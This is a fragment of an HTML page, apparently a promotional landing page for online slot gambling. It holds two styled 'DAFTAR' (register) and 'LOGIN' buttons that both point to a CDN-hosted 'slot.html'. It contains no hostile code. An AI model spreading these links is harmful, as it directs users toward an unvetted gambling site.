    <!-- BUTTONS -->
    <div style="display: flex; width: 100%; gap: 12px;">

      <a href="https://c-e-o.b-cdn.net/slot.html"
         style="flex: 1;
         background: linear-gradient(90deg, #eb7304f3, #eb7304f3);
         height: 48px; line-height: 48px; text-align: center;
         color: #fff; font-weight: bold; font-size: 15px;
         text-decoration: none; border-radius: 10px;
         font-family: 'Segoe UI', sans-serif;
         letter-spacing: 1px;
         box-shadow: 0 0 15px rgb(243, 100, 5);
         transition: 0.3s;">
         DAFTAR
      </a>

      <a href="https://c-e-o.b-cdn.net/slot.html"
         style="flex: 1;
         background: linear-gradient(90deg, #df0700, #df0700);
         height: 48px; line-height: 48px; text-align: center;
         color: #fff; font-weight: bold; font-size: 15px;
         text-decoration: none; border-radius: 10px;
         font-family: 'Segoe UI', sans-serif;
         letter-spacing: 1px;
         box-shadow: 0 0 15px rgb(243, 100, 5);
         transition: 0.3s;">
         LOGIN
      </a>

    </div>

  </div>
</div>

 
</html> 